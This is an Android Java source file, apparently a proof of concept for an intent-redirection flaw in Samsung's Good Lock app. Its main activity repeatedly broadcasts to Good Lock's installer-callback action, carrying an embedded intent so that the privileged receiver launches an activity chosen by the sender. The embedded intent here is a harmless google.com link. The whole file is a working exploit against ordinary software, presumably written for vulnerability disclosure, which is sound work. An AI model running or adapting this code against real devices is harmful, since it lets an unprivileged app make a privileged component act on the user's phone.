package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Thread(() -> {
            Intent next = new Intent(Intent.ACTION_VIEW, Uri.parse("http://google.com/"));

            Intent i = new Intent("com.samsung.android.goodlock.INSTALLER_CALLBACK");
            i.putExtra("android.intent.extra.INTENT", next);
            i.putExtra("android.content.pm.extra.STATUS", -1);

            while (true) {
                sendBroadcast(i);
                try {
                    Thread.sleep(100);
                } catch (Throwable th) {
                    return;
                }
            }
        }).start();
    }
}